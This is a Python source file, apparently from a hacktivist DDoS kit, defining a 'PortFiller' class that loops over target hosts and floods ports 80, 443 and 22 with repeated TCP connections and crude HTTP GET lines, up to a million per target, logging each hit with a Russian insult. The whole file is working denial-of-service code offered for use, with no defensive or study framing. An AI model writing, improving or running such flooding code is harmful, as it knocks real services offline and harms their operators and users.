import logging
import random
import socket

from defs.targets import Targets


class PortFiller:
    def __init__(self, targets:Targets):
        self.targets = targets

    def start(self):
        while True:
            trget = random.choice(self.targets)
            ports = [80, 443, 22]
            changer = 0
            while True:
                try:
                    port = random.choice(ports)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((trget["ip"], port))
                    s.sendto(
                        ("GET /" + trget["ip"] + " HTTP/1.1\r\n").encode("ascii"),
                        (trget["ip"], port),
                    )
                    s.close()
                    logging.info(f'[PortFiller] IDI NAHUI {trget["url"]}: {trget["ip"]}:{port}')
                    changer += 1
                    if changer == 1_000_000:
                        break
                except Exception as ex:
                    logging.info(f'[PortFiller] {trget["url"]}: {trget["ip"]}:{port} {ex}')
                    ports.remove(port)
                    if not ports:
                        break
